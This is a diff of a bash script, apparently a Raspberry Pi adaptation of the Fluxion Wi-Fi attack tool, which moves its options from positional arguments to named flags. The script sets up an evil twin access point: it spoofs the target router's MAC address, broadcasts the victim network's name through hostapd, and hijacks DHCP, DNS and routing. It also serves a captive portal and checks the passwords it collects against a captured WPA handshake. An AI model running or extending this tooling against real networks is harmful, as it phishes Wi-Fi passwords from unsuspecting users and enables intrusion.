@@ -1,39 +1,21 @@
 #!/bin/bash
-function trap_ctrlc ()
-{
-    # perform cleanup here
-    echo "Ctrl-C caught...performing clean up"
-	if [ -z "$(pgrep -f captive_portal_authenticator.sh)" ]; then
-		kill -9 $(pgrep -f captive_portal_authenticator.sh)
-	fi
-	if [ -z "$(pgrep -f fluxion_captive_portal_dns.py)" ]; then
-		kill -9 $(pgrep -f fluxion_captive_portal_dns.py)
-	fi
-	killall -9 hostapd
-	killall -9 lighttpd
-	killall -9 dhcpd
 
-    # exit shell script with error code 2
-    # if omitted, shell script will continue execution
-    exit 2
-}
+while [ "$1" != "" ] && [ "$1" != "--" ]; do
+	case "$1" in
+		-m|--mac) MAC=$2; shift;;
+		-e|--essid) ESSID=$2; shift;;
+		-c|--channel) CHANNEL=$2; shift;;
+		-h|--handshake) HANDSHAKE=$2; shift;;
+		-i|--interface) INTERFACE=$2; shift;;
+	esac
+	shift
+done
 
+shift
 
-# initialise trap to call trap_ctrlc function
-# when signal 2 (SIGINT) is received
-trap "trap_ctrlc" 2
-
-if [ -z "$(pgrep -f captive_portal_authenticator.sh)" ]; then
-kill -9 $(pgrep -f captive_portal_authenticator.sh)
-fi
-if [ -z "$(pgrep -f fluxion_captive_portal_dns.py)" ]; then
-kill -9 $(pgrep -f fluxion_captive_portal_dns.py)
-fi
-
-if (( $# < 3 ));
-  then
-    printf "You need to provide positional arguments - ssid, channel and mac address.\nStart the script like this:\nsudo ./fluxPi.sh HotSpot 6 'xx:xx:xx:xx:xx'\n"
-    exit 1
+if [ "$MAC" == "" ] || [ "$INTERFACE" == "" ] || [ "$ESSID" == "" ] || [ "$CHANNEL" == "" ] || [ "$HANDSHAKE" == "" ]; then
+	printf "You need to provide 5 arguments: -m MAC -e ESSID -c Channel -h 'path to handshake file' -i 'interface to use'.\n\nExample:\n./fluxpi.sh -m 'xx:xx:xx:xx:xx' -e 'AP ESSID' -c '6' -h '/root/network.cap' -i wlan0mon\n"
+	exit
 fi
 
 
@@ -49,10 +31,10 @@ fi
 	chmod 400 "/tmp/fluxpi/server.pem"
 
 		echo "\
-interface=wlan0
+interface=$INTERFACE
 driver=nl80211
-ssid=$1
-channel=$2
+ssid=$ESSID
+channel=$CHANNEL
 hw_mode=g
 auth_algs=1
 wmm_enabled=0
@@ -60,24 +42,23 @@ wmm_enabled=0
 " > "reqs/hostapd.conf"
 	sleep 1
 	cp -r reqs/* /tmp/fluxpi/
-	ip addr add 192.168.254.1/24 dev wlan0
-	cp dump.cap /tmp/fluxpi/network.cap
-	ssid=$1
-	channel=$2
-	mac=$3
-	ifconfig wlan0 down
+	ip addr add 192.168.254.1/24 dev $INTERFACE
+	cp $HANDSHAKE /tmp/fluxpi/network.cap
+	ssid=$ESSID
+	channel=$CHANNEL
+	ifconfig $INTERFACE down
 	sleep 1
-	macchanger -m $mac wlan0
+	macchanger -m $MAC $INTERFACE
 	sleep 1
-	ifconfig wlan0 up
+	ifconfig $INTERFACE up
 	sleep 1
-	sed -i "s|%%SSID%%|$1|g" /tmp/fluxpi/captive_portal/index.html
-        sed -i "s|%%CHANNEL%%|$2|g" /tmp/fluxpi/captive_portal/index.html
-        sed -i "s|%%MAC%%|$3|g" /tmp/fluxpi/captive_portal/index.html
+	sed -i "s|%%SSID%%|$ESSID|g" /tmp/fluxpi/captive_portal/index.html
+        sed -i "s|%%CHANNEL%%|$CHANNEL|g" /tmp/fluxpi/captive_portal/index.html
+        sed -i "s|%%MAC%%|$MAC|g" /tmp/fluxpi/captive_portal/index.html
 	touch /tmp/fluxpi/captive_portal/clients.txt
 	touch /tmp/fluxpi/captive_portal/hit.txt
 	# Activate system IPV4 packet routing/forwarding.
-	sysctl -w net.ipv4.ip_forward=1 &>wlan0
+	sysctl -w net.ipv4.ip_forward=1 &>$INTERFACE
 
 	iptables --flush
 	iptables --table nat --flush
@@ -105,7 +86,7 @@ wmm_enabled=0
 	sleep 1
 	hostapd -B "/tmp/fluxpi/hostapd.conf" &
 	sleep 1
-	dhcpd -f -lf "/tmp/fluxpi/dhcpd.leases" -cf "/tmp/fluxpi/dhcpd.conf" wlan0 | tee -a "/tmp/fluxpi/captive_portal/clients.txt" &
+	dhcpd -f -lf "/tmp/fluxpi/dhcpd.leases" -cf "/tmp/fluxpi/dhcpd.conf" $INTERFACE | tee -a "/tmp/fluxpi/captive_portal/clients.txt" &
 	sleep 1
 	chmod +x "/tmp/fluxpi/fluxion_captive_portal_dns.py"
 	touch "/tmp/fluxpi/dns.log"
@@ -118,14 +99,9 @@ wmm_enabled=0
 	printf "\n"
 	read -p "Press [Enter] key to start backup..."
 	printf "\n"
-	killall -9 dhcpd
-	killall -9 lighttpd
-	killall -9 hostapd
+	killall dhcpd
+	killall lighttpd
+	killall hostapd
 
-	if [ -z "$(pgrep -f captive_portal_authenticator.sh)" ]; then
-	kill -9 $(pgrep -f captive_portal_authenticator.sh)
-	fi
-	if [ -z "$(pgrep -f fluxion_captive_portal_dns.py)" ]; then
-	kill -9 $(pgrep -f fluxion_captive_portal_dns.py)
-	fi
-
+	kill $(pgrep -f captive_portal_authenticator.sh)
+	kill $(pgrep -f fluxion_captive_portal_dns.py)
